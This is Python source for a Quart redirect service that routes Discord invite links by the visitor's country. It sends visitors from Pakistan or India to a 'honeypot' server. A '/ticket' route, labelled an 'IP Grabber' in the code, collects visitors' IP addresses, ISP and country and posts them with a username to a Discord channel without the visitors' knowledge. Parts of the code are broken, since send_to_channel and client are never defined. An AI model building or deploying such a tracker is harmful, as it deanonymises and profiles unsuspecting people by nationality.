"""
GeoIP Redirect Service

This service redirects users based on their country of origin using GeoIP data. 
Users from Pakistan or India will be redirected to an alternative server, while users from other countries will be redirected to a default subdomain.

Dependencies:
- quart: An asynchronous web microframework for Python.

"""

import discord
import requests
from logger import Logger
from json_handler import *
from quart import Quart, redirect, render_template, request

app = Quart(__name__)
l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
default_server:str
alternative_server_url:str
test_flag:bool
redirected:bool
config:dict





async def get_country(ip_address):
    """Retrieve country information for the given IP address."""
    try:
        response = await request_ip_location(ip_address)
        if response and response.get("response_code") == "200":
            country_code = response.get("country_code2")
            return country_code
    except Exception as e:
        l.error(f"Error fetching country information: {e}")
    return None

async def request_ip_location(ip_address):
    """Make a request to the IP location API."""
    url = f"https://api.iplocation.net/?cmd=ip-country&ip={ip_address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        l.error(f"Error fetching IP location: {e}")
    return None

async def redirect_handler(ip ,normal_server, honeypot):
    global redirected
    country_code = await get_country(ip)
    l.info(f'Country code is: {country_code}')
    #if test flag is set redirect every 2nd request to honeypot
    if test_flag:
        if redirected:
            country_code = 'PK'
            l.info(f'Test flag, changed coutry code: {country_code}')
        else:
            l.info(f'Test flag, not changing coutry code')
        redirected = not redirected
        
    if country_code and country_code in ['PK', 'IN']:
        l.info(f"Rediredcting to Honeypot: {honeypot}")
        send_to_channel(f'''
Honeypot triggered:
Honeypot: {honeypot}
IP: {ip}
Country: {country_code}
More infos: https://iplocation.com/?ip={ip}
''')
        return redirect(honeypot)
    
    else:
        l.info(f"Rediredcting to: {normal_server}")
        return redirect(normal_server)

@app.route('/')
async def index():
    l.info('Default route called.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    try:
        return await redirect_handler(ip_address, default_server, alternative_server_url)
    except Exception as e:
        l.error(f'{e}')
        
@app.route('/ticket/<path:dc_handle>')
async def ip_grab(dc_handle):
    l.info('Grabber called.')
    l.info(f'user is: {dc_handle}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    try:
        data = await request_ip_location(ip_address)
        ip = data['ip']
        ip_number = data['ip_number']
        ip_version = data['ip_version']
        country_name = data['country_name']
        country_code2 = data['country_code2']
        isp = data['isp']
        dc_handle += '?'
        l.info(f'data is: {data}')
        await send_to_channel(f'''
IP Grabber called:
Username provided: {dc_handle}
IP: {ip_address}
Country: {country_name}/{country_code2}
More infos: https://iplocation.com/?ip={ip_address}
''')
        return await render_template('result.html',dc_handle = dc_handle, ip=ip, ip_number=ip_number, ip_version=ip_version,
                                country_name=country_name, country_code2=country_code2, isp=isp)
    except Exception as e:
            l.error(f'{e}')

@app.route('/init-bot')
async def start_dc_bot():
    global config, client, channel_id
    if config['dc_logging']:
        l.passing('Initializing DC-Bot')
        token = config['dc_token']
        channel_id = config['dc_channel']
        
        await client.start(token)
        return
    l.warning('DC-Bot not initialized')
    
    return
   
@app.route('/<path:dc_invite>')
async def refer(dc_invite):
    l.info('Custom route called.')
    l.info(f'Route is: {dc_invite}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    custom_server = f'https://discord.gg/{dc_invite}'
    try:
        return await redirect_handler(ip_address, custom_server, alternative_server_url)
    except Exception as e:
            l.error(f'{e}')
    
@app.route('/<path:dc_invite>/<path:honeypot>')
async def refer_custom(dc_invite, honeypot):
    l.info('Custom route called with custom honeypot.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    l.info(f'Route is: {dc_invite}/{honeypot}')
    custom_server = f'https://discord.gg/{dc_invite}'
    custom_honeypot = f'https://discord.gg/{honeypot}'
    try:
        return await redirect_handler(ip_address, custom_server, custom_honeypot)
    except Exception as e:
            l.error(f'{e}')


    

if __name__ == '__main__':
    
    config = read_json_file('config.json')
    test_flag = config['test_flag']
    redirected = False
    if test_flag:
        l.passing('Test flag is set, every second request will be directed to the honey pot')
    default_server = config['default_server']

    alternative_server_url = config['honeypot_server']
    
    app_port = int(config['app_port'])
    
    #bot_process = threading.Thread(target=start_bot)
    
    #bot_process.start()
    
    app.run(host='0.0.0.0',port = app_port)
    #bot_process.join()